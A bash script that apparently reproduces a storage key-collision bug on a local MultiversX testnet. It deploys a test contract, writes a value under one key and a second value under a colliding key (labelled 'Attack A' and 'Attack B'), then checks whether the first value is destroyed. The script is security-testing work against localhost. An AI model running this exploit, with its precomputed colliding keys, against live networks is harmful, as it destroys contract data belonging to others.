#!/bin/bash
PEM=/Users/antics/MultiversX/testnet/node/config/walletKey.pem
WASM=/Users/antics/Documents/mx-chain-go/integrationTests/chainSimulator/dataTrieCollision/testdata/store2.wasm
RT=/tmp/regtools/regtools
WALLET=erd1yfpk24jfnqs6dnezyfegyp8mk3hkmknp552vc0n88hdytms9fg4qkfyx65
OB=http://localhost:10000
V=(http://localhost:9503 http://localhost:9504 http://localhost:9505)
VI=0

getnonce() { curl -s --max-time 5 "$OB/address/$WALLET" | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['account']['nonce'])" 2>/dev/null; }

send() { # args: nonce "kind" rest...
  local N=$1; shift
  local KIND=$1; shift
  local API=${V[$VI]}
  VI=$(( (VI+1) % 3 ))
  if [ "$KIND" = "deploy" ]; then
    $RT deploy $PEM $WASM $N 2>/dev/null | grep scAddress | awk '{print $2}'
  else
    local SC=$1; shift
    API=$API $RT call $PEM $SC $N "$@" >/dev/null 2>&1
  fi
}

waitnonce() { # wait until wallet nonce > $1
  local TARGET=$1
  for i in $(seq 1 30); do
    local NN=$(getnonce)
    if [ "$NN" -gt "$TARGET" ] 2>/dev/null; then echo $NN; return 0; fi
    sleep 4
  done
  echo "TIMEOUT_AT_$TARGET"; return 1
}

K1B=6e6f6e6465742d7265616c2d6e6f64652d6b65792d3031
K2B=2b8188f9e77751cf1eb5d3768d2e8f20d8f1c8967751670fb60a57a93b428b94
K1=64657465726d696e69737469632d6b65792d30303031
K2=4cf815852db3e7fd2a0d937662f1363ebcfa38cee91bd0d8d7f6296e21b03555
V1=76616c75652073746f72656420756e646572204b31
V2=76616c75652073746f72656420756e646572204b32

echo "=== waiting for epoch >= 1 ==="
for i in $(seq 1 40); do
  EP=$(grep -oh "\[0/[0-9]*/[0-9]*/(END_ROUND)\]" ~/MultiversX/testnet/node_working_dirs/validator3/logs/*.log 2>/dev/null | tail -1 | cut -d/ -f2)
  [ -n "$EP" ] && [ "$EP" -ge 1 ] && break
  sleep 6
done
echo "epoch now: $EP"

N=$(getnonce); echo "start nonce: $N"
echo "=== Attack A: deploy + store K1 + store K2=blake2b(K1) ==="
SCA=$(send $N deploy); N=$((N+1)); waitnonce $((N-1)) >/dev/null
echo "contract A: $SCA"
send $N call $SCA store1 $K1 $V1; N=$((N+1)); waitnonce $((N-1)) >/dev/null
echo "load1(K1) before: $($RT query $SCA load1 $K1 | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])')"
send $N call $SCA store1 $K2 $V2; N=$((N+1)); waitnonce $((N-1)) >/dev/null
RA=$($RT query $SCA load1 $K1 | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])')
echo "load1(K1) after K2 write: '$RA'  (empty => destroyed)"

echo ""
echo "=== Attack B: 10 rounds of one-tx store2 (both keys, single flush) ==="
for R in $(seq 1 10); do
  SC=$(send $N deploy); N=$((N+1)); waitnonce $((N-1)) >/dev/null
  send $N call $SC store2 $K1B 7631 $K2B 7632; N=$((N+1)); waitnonce $((N-1)) >/dev/null
  OUT=$($RT query $SC load1 $K1B | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])' 2>/dev/null)
  if [ "$OUT" = "7631" ]; then STATE="INTACT"; elif [ -z "$OUT" ]; then STATE="DESTROYED"; else STATE="OTHER:$OUT"; fi
  echo "round $R: $SC -> K1b $STATE"
done
echo "FINAL_NONCE=$N"
